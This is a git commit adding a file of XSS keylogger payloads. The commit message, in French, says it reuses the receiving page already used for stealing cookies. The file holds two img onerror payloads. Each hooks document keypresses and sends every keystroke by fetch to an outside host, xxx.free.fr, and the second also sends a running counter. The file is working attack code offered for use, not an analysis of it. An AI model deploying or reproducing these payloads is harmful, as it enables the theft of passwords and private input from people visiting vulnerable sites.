09f16c95876118fa6586da05b73fd02b021e45f2
lamarcos <40102072+lamarcos@users.noreply.github.com>
2022-08-16 15:08:38 +0200

    Create Keylogger.js
    Keylogger pour faille xss
    
    On reprend la même page de réception que pour les cookie

---
+++ XssFaille/Keylogger.js
@@ -0,0 +1,9 @@
+
+// Keylogger sans compteur
+<img src=x onerror='document.onkeypress=function(e){fetch("http://xxx.free.fr/test/a.php?c="+String.fromCharCode(e.which))},this.remove();'>
+
+// Keylogger avec compteur
+  <img src=x onerror='varjj = 0,document.onkeypress=function(e){varjj = varjj+1;fetch("http://xxx.free.fr/test/a.php?c="+varjj +String.fromCharCode(e.which))},this.remove();'>
+    
+ 
+    
